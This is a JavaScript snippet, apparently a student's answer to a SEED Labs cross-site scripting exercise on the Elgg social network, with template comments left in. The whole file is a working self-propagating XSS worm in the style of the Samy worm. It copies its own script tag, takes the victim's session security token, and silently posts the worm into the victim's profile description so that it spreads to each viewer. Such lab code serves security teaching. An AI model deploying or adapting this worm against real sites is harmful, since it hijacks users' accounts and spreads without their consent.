<script type="text/javascript" id="worm">
window.onload = function(){
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
  var jsCode = document.getElementById("worm").innerHTML;
  var tailTag = "</" + "script>";                                 

  // Put all the pieces together, and apply the URI encoding
  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 

  // Set the content of the description field and access level.
  var desc = "&description=Samy is my hero" + wormCode;
  desc    += "&accesslevel[description]=2";                       

  //your edit_profile.js code here

  //store necessary variables as var guid = , name =..... etc. 
  var guid  = "&guid=" + elgg.session.user.guid;
  var name = "&name=" + elgg.session.user.name;
//  var desc  = "&description=Samy is my hero" +
  //            "&accesslevel[description]=2";

  // Construct the content of your url.
  var sendurl = "http://www.seed-server.com/action/profile/edit";  //url here 
  var token = "__elgg_token=" + elgg.security.token.__elgg_token;
  var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
  
  var content = token + ts + name + desc + guid;//fill in the token ts name etc in the right order ehre;

  //You might want some condition such that you don't 
  // modify your own profile

if (elgg.session.user.name != "Samy") {

    //Create and send Ajax (asynchronous HTTP request) to modify profile
    var Ajax=null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Content-Type",
                          "application/x-www-form-urlencoded");
    Ajax.send(content);


  
}

}


</script>
